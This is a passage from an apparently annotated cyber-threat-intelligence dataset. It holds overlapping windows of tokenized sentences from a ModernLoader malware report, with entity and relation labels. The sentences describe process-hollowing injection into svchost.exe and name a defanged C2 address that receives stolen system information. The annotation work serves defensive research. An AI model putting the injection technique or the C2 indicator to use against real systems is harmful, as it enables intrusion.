"1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [32, 32], "name": "process", "pos": [4, 5], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [43, 43], "name": "RegSvcs.exe", "pos": [15, 16], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [46, 46], "name": "Friday.dll", "pos": [0, 1], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [57, 57], "name": "RegSvcs.exe", "pos": [11, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [69, 69], "name": "It", "pos": [0, 1], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [74, 74], "name": "svchost.exe", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [98, 98], "name": "svchost.exe", "pos": [4, 5], "index": "8_0"}]], "labels": [{"r": "FR", "evidence": [2], "h": 1, "t": 2}, {"r": "EX", "evidence": [0, 1, 2], "t": 0, "h": 2}, {"r": "IJ", "evidence": [2], "h": 2, "t": 3}, {"r": "RD", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "EX", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 2, "t": 7}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 2, "t": 8}, {"r": "WR", "evidence": [3], "t": 4, "h": 5}, {"r": "WR", "evidence": [3], "t": 4, "h": 5}, {"r": "FR", "evidence": [3, 4, 5], "h": 5, "t": 6}]}, {"title": "05-22", "sents": [["It", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", "."], ["It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["Friday.dll", "module", "is", "used", "to", "inject", "the", "next", "injection", "stage", "into", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", "."], ["It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injector", "creates", "a", "svchost.exe", "process", "in", "suspended", "mode", "and", "then", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."], ["The", "original", "svchost", "module", "is", "unmapped", "by", "calling", "the", "ZwUnmapViewOfSection", "."], ["This", "is", "followed", "by", "the", "fairly", "common", "injection", "sequence", "of", "API", "calls", "to", "get", "thread", "context", ",", "copy", "the", "data", "from", "the", "payload", "to", "the", "allocated", "virtual", "memory", ",", "set", "the", "thread", "context", "to", "point", "to", "the", "payload", "entry", "point", "and", ",", "finally", ",", "to", "resume", "the", "suspended", "thread", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "process", "pos": [4, 5], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [31, 31], "name": "RegSvcs.exe", "pos": [15, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [34, 34], "name": "Friday.dll", "pos": [0, 1], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [45, 45], "name": "RegSvcs.exe", "pos": [11, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [57, 57], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [62, 62], "name": "svchost.exe", "pos": [5, 6], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [86, 86], "name": "svchost.exe", "pos": [4, 5], "index": "7_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 0, "t": 1}, {"r": "IJ", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "EX", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 1, "t": 6}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 1, "t": 7}, {"r": "WR", "evidence": [2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2], "t": 3, "h": 4}, {"r": "FR", "evidence": [2, 3, 4], "h": 4, "t": 5}]}, {"title": "05-23", "sents": [["It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["Friday.dll", "module", "is", "used", "to", "inject", "the", "next", "injection", "stage", "into", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", "."], ["It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injector", "creates", "a", "svchost.exe", "process", "in", "suspended", "mode", "and", "then", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."], ["The", "original", "svchost", "module", "is", "unmapped", "by", "calling", "the", "ZwUnmapViewOfSection", "."], ["This", "is", "followed", "by", "the", "fairly", "common", "injection", "sequence", "of", "API", "calls", "to", "get", "thread", "context", ",", "copy", "the", "data", "from", "the", "payload", "to", "the", "allocated", "virtual", "memory", ",", "set", "the", "thread", "context", "to", "point", "to", "the", "payload", "entry", "point", "and", ",", "finally", ",", "to", "resume", "the", "suspended", "thread", "."], ["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "process", "pos": [4, 5], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [15, 15], "name": "RegSvcs.exe", "pos": [15, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [18, 18], "name": "Friday.dll", "pos": [0, 1], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [29, 29], "name": "RegSvcs.exe", "pos": [11, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [41, 41], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [46, 46], "name": "svchost.exe", "pos": [5, 6], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [70, 70], "name": "svchost.exe", "pos": [4, 5], "index": "7_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "IJ", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "EX", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 7}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "FR", "evidence": [1, 2, 3], "h": 4, "t": 5}]}, {"title": "05-24", "sents": [["Friday.dll", "module", "is", "used", "to", "inject", "the", "next", "injection", "stage", "into", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", "."], ["It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injector", "creates", "a", "svchost.exe", "process", "in", "suspended", "mode", "and", "then", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."], ["The", "original", "svchost", "module", "is", "unmapped", "by", "calling", "the", "ZwUnmapViewOfSection", "."], ["This", "is", "followed", "by", "the", "fairly", "common", "injection", "sequence", "of", "API", "calls", "to", "get", "thread", "context", ",", "copy", "the", "data", "from", "the", "payload", "to", "the", "allocated", "virtual", "memory", ",", "set", "the", "thread", "context", "to", "point", "to", "the", "payload", "entry", "point", "and", ",", "finally", ",", "to", "resume", "the", "suspended", "thread", "."], ["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."], ["The", "injected", "payload", "is", "Client.exe", "(", "HASH", ")", ",", "a", "ModernLoader", "instance", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "Friday.dll", "pos": [0, 1], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [11, 11], "name": "RegSvcs.exe", "pos": [11, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [23, 23], "name": "It", "pos": [0, 1], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [28, 28], "name": "svchost.exe", "pos": [5, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [52, 52], "name": "svchost.exe", "pos": [4, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [168, 168], "name": "Client.exe", "pos": [4, 5], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [174, 174], "name": "ModernLoader", "pos": [10, 11], "index": "6_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0, 1, 2], "h": 1, "t": 2}, {"r": "FR", "evidence": [3, 4, 5, 6, 7], "h": 4, "t": 5}, {"r": "CO", "evidence": [7], "h": 5, "t": 6}]}, {"title": "05-25", "sents": [["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", "."], ["It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injector", "creates", "a", "svchost.exe", "process", "in", "suspended", "mode", "and", "then", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."], ["The", "original", "svchost", "module", "is", "unmapped", "by", "calling", "the", "ZwUnmapViewOfSection", "."], ["This", "is", "followed", "by", "the", "fairly", "common", "injection", "sequence", "of", "API", "calls", "to", "get", "thread", "context", ",", "copy", "the", "data", "from", "the", "payload", "to", "the", "allocated", "virtual", "memory", ",", "set", "the", "thread", "context", "to", "point", "to", "the", "payload", "entry", "point", "and", ",", "finally", ",", "to", "resume", "the", "suspended", "thread", "."], ["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."], ["The", "injected", "payload", "is", "Client.exe", "(", "HASH", ")", ",", "a", "ModernLoader", "instance", "."], ["The", "payload", "for", "the", "initial", "loader", "URL", "is", "a", "simple", ".NET", "remote", "access", "trojan", ",", "ModernLoader", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [9, 9], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "svchost.exe", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [38, 38], "name": "svchost.exe", "pos": [4, 5], "index": "2_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [154, 154], "name": "Client.exe", "pos": [4, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [160, 160], "name": "ModernLoader", "pos": [10, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [178, 178], "name": "ModernLoader", "pos": [15, 16], "index": "5_0"}]], "labels": [{"r": "FR", "evidence": [2, 3, 4, 5, 6], "h": 2, "t": 3}, {"r": "CO", "evidence": [6], "h": 3, "t": 4}, {"r": "CO", "evidence": [6, 7], "h": 3, "t": 5}]}, {"title": "05-26", "sents": [["It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injector", "creates", "a", "svchost.exe", "process", "in", "suspended", "mode", "and", "then", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."], ["The", "original", "svchost", "module", "is", "unmapped", "by", "calling", "the", "ZwUnmapViewOfSection", "."], ["This", "is", "followed", "by", "the", "fairly", "common", "injection", "sequence", "of", "API", "calls", "to", "get", "thread", "context", ",", "copy", "the", "data", "from", "the", "payload", "to", "the", "allocated", "virtual", "memory", ",", "set", "the", "thread", "context", "to", "point", "to", "the", "payload", "entry", "point", "and", ",", "finally", ",", "to", "resume", "the", "suspended", "thread", "."], ["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."], ["The", "injected", "payload", "is", "Client.exe", "(", "HASH", ")", ",", "a", "ModernLoader", "instance", "."], ["The", "payload", "for", "the", "initial", "loader", "URL", "is", "a", "simple", ".NET", "remote", "access", "trojan", ",", "ModernLoader", "."], ["ModernLoader", "'", "s", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "svchost.exe", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "svchost.exe", "pos": [4, 5], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [145, 145], "name": "Client.exe", "pos": [4, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [151, 151], "name": "ModernLoader", "pos": [10, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [169, 169], "name": "ModernLoader", "pos": [15, 16], "index": "5_0"}]], "labels": [{"r": "FR", "evidence": [1, 2, 3, 4, 5], "h": 2, "t": 3}, {"r": "CO", "evidence": [5], "h": 3, "t": 4}, {"r": "CO", "evidence": [5, 6], "h": 3, "t": 5}]}, {"title": "05-27", "sents": [["The", "injector", "creates", "a", "svchost.exe", "process", "in", "suspended", "mode", "and", "then", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."], ["The", "original", "svchost", "module", "is", "unmapped", "by", "calling", "the", "ZwUnmapViewOfSection", "."], ["This", "is", "followed", "by", "the", "fairly", "common", "injection", "sequence", "of", "API", "calls", "to", "get", "thread", "context", ",", "copy", "the", "data", "from", "the", "payload", "to", "the", "allocated", "virtual", "memory", ",", "set", "the", "thread", "context", "to", "point", "to", "the", "payload", "entry", "point", "and", ",", "finally", ",", "to", "resume", "the", "suspended", "thread", "."], ["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."], ["The", "injected", "payload", "is", "Client.exe", "(", "HASH", ")", ",", "a", "ModernLoader", "instance", "."], ["The", "payload", "for", "the", "initial", "loader", "URL", "is", "a", "simple", ".NET", "remote", "access", "trojan", ",", "ModernLoader", "."], ["ModernLoader", "'", "s", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["Once", "the", "bot", "is", "initialized", ",", "it", "collects", "the", "following", "information", "about", "the", "system", "and", "send", "the", "information", "to", "the", "C2", "server", "using", "the", "HTTP", "Post", "request", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "svchost.exe", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [120, 120], "name": "Client.exe", "pos": [4, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [126, 126], "name": "ModernLoader", "pos": [10, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [144, 144], "name": "ModernLoader", "pos": [15, 16], "index": "3_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [165, 165], "name": "it", "pos": [6, 7], "index": "4_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [169, 169], "name": "information about the system", "pos": [10, 14], "index": "5_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [175, 175], "name": "the information", "pos": [16, 18], "index": "6_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [187, 187], "name": "hxxp : //31.41.244.231/AVAVA/gate.php", "pos": [28, 31], "index": "7_0"}]], "labels": [{"r": "FR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 1}, {"r": "CO", "evidence": [4], "h": 1, "t": 2}, {"r": "CO", "evidence": [4, 5], "h": 1, "t": 3}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 1, "t": 4}, {"r": "RD", "evidence": [7], "h": 4, "t": 5}, {"r": "WR", "evidence": [7], "h": 4, "t": 6}, {"r": "ST", "evidence": [7], "h": 4, "t": 7}]}, {"title": "05-28", "sents": [["The", "original", "svchost", "module", "is", "unmapped", "by", "calling", "the", "ZwUnmapViewOfSection", "."], ["This", "is", "followed", "by", "the", "fairly", "common", "injection", "sequence", "of", "API", "calls", "to", "get", "thread", "context", ",", "copy", "the", "data", "from", "the", "payload", "to", "the", "allocated", "virtual", "memory", ",", "set", "the", "thread", "context", "to", "point", "to", "the", "payload", "entry", "point", "and", ",", "finally", ",", "to", "resume", "the", "suspended", "thread", "."], ["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."], ["The", "injected", "payload", "is", "Client.exe", "(", "HASH", ")", ",", "a", "ModernLoader", "instance", "."], ["The", "payload", "for", "the", "initial", "loader", "URL", "is", "a", "simple", ".NET", "remote", "access", "trojan", ",", "ModernLoader", "."], ["ModernLoader", "'", "s", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["Once", "the", "bot", "is", "initialized", ",", "it", "collects", "the", "following", "information", "about", "the", "system", "and", "send", "the", "information", "to", "the", "C2", "server", "using", "the", "HTTP", "Post", "request", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", ":"], ["Win32_ComputerSystemProduct", "UUID", "(", "using", "WMI", "to", "query", "the", "configuration", "data", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 3, "global_pos": [98, 98], "name": "Client.exe", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [104, 104], "name": "ModernLoader", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [122, 122], "name": "ModernLoader", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [143, 143], "name": "it", "pos": [6, 7], "index": "3_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [147, 147], "name": "information about the system", "pos": [10, 14], "index": "4_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [153, 153], "name": "the information", "pos": [16, 18], "index": "5_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [165, 165], "name": "hxxp : //31.41.244.231/AVAVA/gate.php", "pos": [28, 31], "index": "6_0"}]], "labels": [{"r": "CO", "evidence": [3], "h": 0, "t": 1}, {"r": "CO", "evidence": [3, 4], "h": 0, "t": 2}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 0, "t": 3}, {"r": "RD", "evidence": [6], "h": 3, "t": 4}, {"r": "WR", "evidence": [6], "h": 3, "t": 5}, {"r": "ST", "evidence": [6], "h": 3, "t": 6}]}, {"title": "05-29", "sents": [["This", "is", "followed", "by", "the", "fairly", "common", "injection", "sequence", "of", "API", "calls", "to", "get", "thread", "context", ",", "copy", "the", "data", "from", "the", "payload", "to", "the", "allocated", "virtual", "memory", ",", "set", "the", "thread", "context", "to", "point", "to", "the", "payload", "entry", "point", "and", ",", "finally", ",", "to", "resume", "the", "suspended", "thread", "."], ["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."], ["The", "injected", "payload", "is", "Client.exe", "(", "HASH", ")", ",", "a", "ModernLoader", "instance", "."], ["The", "payload", "for", "the", "initial", "loader", "URL", "is", "a", "simple", ".NET", "remote", "access", "trojan", ",", "ModernLoader", "."], ["ModernLoader", "'", "s", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["Once", "the", "bot", "is", "initialized", ",", "it", "collects", "the", "following", "information", "about", "the", "system", "and", "send", "the", "information", "to", "the", "C2", "server", "using", "the", "HTTP", "Post", "request", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", ":"], ["Win32_ComputerSystemProduct", "UUID", "(", "using", "WMI", "to", "query", "the", "configuration", "data", ")", "."], ["The", "external", "IP", "address", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/ip", "."]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [87, 87], "name": "Client.exe", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [93, 93], "name": "ModernLoader", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [111, 111], "name": "ModernLoader", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [132, 132], "name": "it", "pos": [6, 7], "index": "3_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [136, 136], "name": "information about the system", "pos": [10, 14], "index": "4_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [142, 142], "name": "the information", "pos": [16, 18], "index": "5_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [154, 154], "name": "hxxp : //31.41.244.231/AVAVA/gate.php", "pos": [28, 31], "index": "6_0"}]], "labels": [{"r": "CO", "evidence": [2], "h": 0, "t": 1}, {"r": "CO", "evidence": [2, 3], "h": 0, "t": 2}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 0, "t": 3}, {"r": "RD", "evidence": [5], "h": 3, "t": 4}, {"r": "WR", "evidence": [5], "h": 3, "t": 5}, {"r": "ST", "evidence": [5], "h": 3, "t": 6}]}, {"title": "05-30", "sents": [["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."], ["The", "injected", "payload", "is", "Client.exe", "(", "HASH", ")", ",", "a", "ModernLoader", "instance", "."], ["The", "payload", "for", "the", "initial", "loader", "URL", "is", "a", "simple", ".NET", "remote", "access", "trojan", ",", "ModernLoader", "."], ["ModernLoader", "'", "s", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["Once", "the", "bot", "is", "initialized", ",", "it", "collects", "the", "following", "information", "about", "the", "system", "and", "send", "the", "information", "to", "the", "C2", "server", "using", "the", "HTTP", "Post", "request", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", ":"], ["Win32_ComputerSystemProduct", "UUID", "(", "using", "WMI", "to", "query", "the", "configuration", "data", ")", "."], ["The", "external", "IP", "address", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/ip", "."], ["The", "IP", "address", "country", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/country", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "Client.exe", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "ModernLoader", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "ModernLoader", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [82, 82], "name": "it", "pos": [6, 7], "index": "3_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [86, 86], "name": "information about the system", "pos": [10, 14], "index": "4_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [92, 92], "name": "the information", "pos": [16, 18], "index": "5_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [104, 104], "name": "hxxp : //31.41.244.231/AVAVA/gate.php", "pos": [28, 31], "index": "6_0"}]], "labels": [{"r": "CO", "evidence": [1], "h": 0, "t": 1}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 0, "t": 3}, {"r": "RD", "evidence": [4], "h": 3, "t": 4}, {"r": "WR", "evidence": [4], "h": 3, "t": 5}, {"r": "ST", "evidence": [4], "h": 3, "t": 6}]}, {"title": "05-31", "sents": [["The", "injected", "payload", "is", "Client.exe", "(", "HASH", ")", ",", "a", "ModernLoader", "instance", "."], ["The", "payload", "for", "the", "initial", "loader", "URL", "is", "a", "simple", ".NET", "remote", "access", "trojan", ",", "ModernLoader", "."], ["ModernLoader", "'", "s", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["Once", "the", "bot", "is", "initialized", ",", "it", "collects", "the", "following", "information", "about", "the", "system", "and", "send", "the", "information", "to", "the", "C2", "server", "using", "the", "HTTP", "Post", "request", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", ":"], ["Win32_ComputerSystemProduct", "UUID", "(", "using", "WMI", "to", "query", "the", "configuration", "data", ")", "."], ["The", "external", "IP", "address", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/ip", "."], ["The", "IP", "address", "country", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/country", "."], ["The", "user", "privileges", "(", "admin", "or", "user", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "Client.exe", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "ModernLoader", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "ModernLoader", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [49, 49], "name": "it", "pos": [6, 7], "index": "3_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [53, 53], "name": "information about the system", "pos": [10, 14], "index": "4_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [59, 59], "name": "the information", "pos": [16, 18], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [71, 71], "name": "hxxp : //31.41.244.231/AVAVA/gate.php", "pos": [28, 31], "index": "6_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 3}, {"r": "RD", "evidence": [3], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "h": 3, "t": 5}, {"r": "ST", "evidence": [3], "h": 3, "t": 6}]}, {"title": "05-32", "sents": [["The", "payload", "for", "the", "initial", "loader", "URL", "is", "a", "simple", ".NET", "remote", "access", "trojan", ",", "ModernLoader", "."], ["ModernLoader", "'", "s", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["Once", "the", "bot", "is", "initialized", ",", "it", "collects", "the", "following", "information", "about", "the", "system", "and", "send", "the", "information", "to", "the", "C2", "server", "using", "the", "HTTP", "Post", "request", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", ":"], ["Win32_ComputerSystemProduct", "UUID", "(", "using", "WMI", "to", "query", "the", "configuration", "data", ")", "."], ["The", "external", "IP", "address", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/ip", "."], ["The", "IP", "address", "country", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/country", "."], ["The", "user", "privileges", "(", "admin", "or", "user", ")", "."], ["Once", "the", "initial", "data", "is", "sent", ",", "ModerLoader", "reads", "the", "response", "to", "find", "tasks", "returned", "from", "the", "servers", "using", "the", "JSON", "format", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "ModernLoader", "pos": [15, 16], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [36, 36], "name": "it", "pos": [6, 7], "index": "1_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [40, 40], "name": "information about the system", "pos": [10, 14], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [46, 46], "name": "the information", "pos": [16, 18], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [58, 58], "name": "hxxp : //31.41.244.231/AVAVA/gate.php", "pos": [28, 31], "index": "4_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [116, 116], "name": "ModerLoader", "pos": [7, 8], "index": "5_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [125, 125], "name": "the servers", "pos": 